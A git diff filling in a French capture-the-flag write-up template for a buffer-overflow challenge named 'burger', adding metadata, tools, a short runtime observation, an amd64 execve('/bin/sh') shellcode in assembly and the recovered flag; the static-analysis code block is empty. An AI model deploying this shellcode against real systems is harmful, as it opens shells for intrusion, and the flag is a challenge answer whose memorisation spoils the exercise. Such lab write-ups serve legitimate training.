@@ -1,12 +1,12 @@
 ---
 title: "burger"
-challenge: "root-me/picoCTF"
+challenge: "Neal"
 difficulty: "5"
 platform: "amd64/remote"
-date: "YYYY-MM-DD"
+date: "2025-10-29"
 tags: [binary, overflow]
 author: "Ryan Bouchou"
-status: "in-progress"
+status: "achieved"
 ---
 
 # Titre lisible
@@ -18,23 +18,23 @@ Résumé court...
 
 ## Contexte
 
-- Source : root-me / cours / picoCTF
-- Environnement testé : Ubuntu 22.04, amd64, glibc 2.35
-- Fichiers fournis : vuln, main.c, libc.so
+- Source : Neal
+- Environnement testé : Arch Linux, amd64, glibc <>
+- Fichiers fournis : `main.c`, `8-prepa-01-burger`
 
 ---
 
 ## Objectif
 
-Récupérer la flag / obtenir un shell
+Récupérer le flag en obtenant un shell.
 
 ---
 
 ## Outils
 
-- gdb + gef / pwndbg
-- pwntools (python3)
-- readelf / objdump / strings / file
+- gdb + gef
+- pwntools
+- objdump
 
 ---
 
@@ -42,33 +42,39 @@ Récupérer la flag / obtenir un shell
 
 ### 1) Reconnaissance statique
 
-- commandes & observations
+- La capture du payload est conditionnée par la fonction suivante :
+
+```c
+
+```
 
 ### 2) Analyse dynamique
 
-- breakpoints, comportement runtime
-
-payload trop gand, d'un octet, et canary décalé.
+- On remarque entre autres que `rax`, `rbx` et `rdx` sont nuls après l'instruction `ret`
 
 ### 3) Exploit
 
-Stratégie : ret2libc / overflow / format-string
-
-Payload (extrait) :
-
-```py
-from pwn import *
-context.update(arch='amd64', timeout=2)
-p = process('./build/a.out')
-p.sendline(b'...')
-p.interactive()
+```asm
+global _start
+section .text
+_start:
+  ; On simule piece2
+  mov rdi, "//bin/sh"
+  shr rdi, 8
+  ; jump rel8
+  xor rsi, rsi
+  push rsi
+  push rdi
+  mov rdi, rsp
+  mov al, 0x3b
+  syscall
 ```
 
 ---
 
 ## Résultat
 
-- Flag : CTF{...}
+- Flag {02da1bb071fc47d6525fbcc218212329}
 
 ## Root cause
 
